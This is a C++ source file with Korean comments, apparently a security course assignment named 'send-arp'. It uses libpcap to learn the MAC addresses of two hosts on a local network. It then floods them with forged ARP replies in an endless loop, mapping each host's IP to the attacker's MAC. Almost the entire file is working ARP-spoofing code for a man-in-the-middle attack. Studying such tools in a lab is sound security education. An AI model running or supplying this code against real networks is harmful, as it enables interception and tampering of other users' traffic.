#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h> // 네트워크 인터페이스 정보를 가져오기 위한 헤더 파일
#include "ethhdr.h"
#include "arphdr.h"
#include <ctime>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_wlan_ip(char *ip) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        if (strncmp(ifa->ifa_name, "wlan", 4) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &(sa->sin_addr), ip, INET_ADDRSTRLEN);

                freeifaddrs(ifaddr);
                return 0;
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;
}

int get_wlan_mac(unsigned char *mac) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        if (strncmp(ifa->ifa_name, "wlan", 4) == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("socket");
                freeifaddrs(ifaddr);
                return -1;
            }

            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ-1);
            ifr.ifr_name[IFNAMSIZ-1] = '\0';

            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
                close(sock);
                freeifaddrs(ifaddr);
                return 0;
            } else {
                perror("ioctl");
                close(sock);
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;
}

void send_arp_request(pcap_t *handle, const char *src_ip, const char *dst_ip, const unsigned char *src_mac, const unsigned char *broadcast_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(broadcast_mac);     // 브로드캐스트 주소
    packet.eth_.smac_ = Mac(src_mac);           // 로컬 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);     // ARP 패킷

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // Ethernet
    packet.arp_.pro_ = htons(EthHdr::Ip4);      // IPv4
    packet.arp_.hln_ = Mac::SIZE;               // MAC 주소 크기
    packet.arp_.pln_ = Ip::SIZE;                // IP 주소 크기
    packet.arp_.op_ = htons(ArpHdr::Request);   // ARP 요청

    packet.arp_.smac_ = Mac(src_mac);           // 로컬 MAC 주소
    packet.arp_.sip_ = htonl(Ip(src_ip));       // 로컬 IP 주소
    packet.arp_.tmac_ = Mac::nullMac();         // 타겟 MAC 주소(아직 알 수 없음)
    packet.arp_.tip_ = htonl(Ip(dst_ip));       // 타겟 IP 주소

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int receive_arp_reply(pcap_t *handle, const char *target_ip, unsigned char *mac_address) {
    while (true) {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; // 타임아웃
        if (res == -1 || res == -2) break; // 에러 혹은 패킷 끝

        EthArpPacket *eth_arp_packet = (EthArpPacket *)packet;

        if (ntohs(eth_arp_packet->eth_.type_) == EthHdr::Arp &&
            ntohs(eth_arp_packet->arp_.op_) == ArpHdr::Reply) {
            if (ntohl(eth_arp_packet->arp_.sip_) == Ip(target_ip)) {
                memcpy(mac_address, reinterpret_cast<const uint8_t*>(&eth_arp_packet->arp_.smac_), 6);
                return 0;
            }
        }
    }
    return -1;
}

void send_arp_reply(pcap_t *handle, const char *src_ip, const char *dst_ip, const unsigned char *src_mac, const unsigned char *dst_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dst_mac);     // Sender MAC 주소
    packet.eth_.smac_ = Mac(src_mac);     // 나의 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);   // ARP 패킷

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);  // Ethernet
    packet.arp_.pro_ = htons(EthHdr::Ip4);    // IPv4
    packet.arp_.hln_ = Mac::SIZE;             // MAC 주소 크기
    packet.arp_.pln_ = Ip::SIZE;              // IP 주소 크기
    packet.arp_.op_ = htons(ArpHdr::Reply);   // ARP 응답

    packet.arp_.smac_ = Mac(src_mac);         // 나의 MAC 주소
    packet.arp_.sip_ = htonl(Ip(src_ip));     // Target IP 주소 (Sender에게는 이 IP로 요청하라고 대답)
    packet.arp_.tmac_ = Mac(dst_mac);         // Sender의 MAC 주소
    packet.arp_.tip_ = htonl(Ip(dst_ip));     // Sender IP 주소

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int get_mac_about_ip(pcap_t *handle, const char *iface, const char *ip, unsigned char *mac_address) {
    unsigned char local_mac[6];
    unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    if (get_wlan_mac(local_mac) == -1) {
        fprintf(stderr, "Failed to get local MAC address\n");
        return -1;
    }

    char local_ip[INET_ADDRSTRLEN];
    if (get_wlan_ip(local_ip) == -1) {
        fprintf(stderr, "Failed to get local IP address\n");
        return -1;
    }

    // ARP 요청 패킷을 보냄
    send_arp_request(handle, local_ip, ip, local_mac, broadcast_mac);

    // ARP 응답을 기다리고 수신하여 MAC 주소 추출
    if (receive_arp_reply(handle, ip, mac_address) == -1) {
        fprintf(stderr, "Failed to receive ARP reply\n");
        return -1;
    }

    return 0;

}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char iface[] = "wlan0";
    unsigned char target_mac[6];
    unsigned char sender_mac[6];
    unsigned char attacker_mac[6];

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    get_mac_about_ip(handle, iface, argv[2], sender_mac); // Sender MAC 얻기
    get_mac_about_ip(handle, iface, argv[3], target_mac); // Target MAC 얻기
    get_wlan_mac(attacker_mac);                           // Attacker MAC 얻기

    time_t last_arp_update_time = 0;
    char attacker_mac_str[18];
    snprintf(attacker_mac_str, sizeof(attacker_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
         attacker_mac[0], attacker_mac[1], attacker_mac[2],
         attacker_mac[3], attacker_mac[4], attacker_mac[5]);
    
    int num = 0;

    while (true) {


        if( num >= 1000 ){
        send_arp_reply(handle, argv[3], argv[2], attacker_mac, sender_mac);
        sleep(1);
	num = 0;
        }
        send_arp_reply(handle, argv[2], argv[3], attacker_mac, target_mac); // Target에게 Sender의 MAC 주소를 Attacker로 설정

        num++;
        printf("Sent ARP Reply: %s is at %s\n", argv[3], attacker_mac_str); // Target IP -> Attacker MAC
        printf("Sent ARP Reply: %s is at %s\n", argv[2], attacker_mac_str); // Sender IP -> Attacker MAC
        
    }

    pcap_close(handle);
    return 0;
}
    
